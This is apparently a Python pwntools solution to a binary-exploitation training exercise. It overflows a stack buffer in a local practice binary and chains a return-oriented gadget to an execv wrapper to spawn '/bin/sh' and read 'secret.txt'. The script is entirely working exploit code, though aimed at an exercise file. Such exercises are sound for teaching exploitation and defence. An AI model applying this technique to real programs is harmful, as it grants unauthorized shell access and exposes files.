#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./gadget-exercise2.bin")
    rdi_gadget = p64(0x4007b3) 
    execv_addr = p64(0x400676)       # "execv_wrapper
    safe_addr=p64(0x400697)
    global_buf=p64(0x601080)
    vuln_addr=p64(0x4006c4)
    #input("input ")
    p.recvuntil("Input your message in stack buffer: ")
    p.send(b"a"*0x28 + safe_addr+vuln_addr)

    p.recvuntil("Input your message in global buffer: ")
    p.sendline(b"/bin/sh\x00")
    
    p.recvuntil("Input your message in stack buffer: ")
    p.send(b"a"*0x28 + rdi_gadget+ global_buf+ execv_addr)
    
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
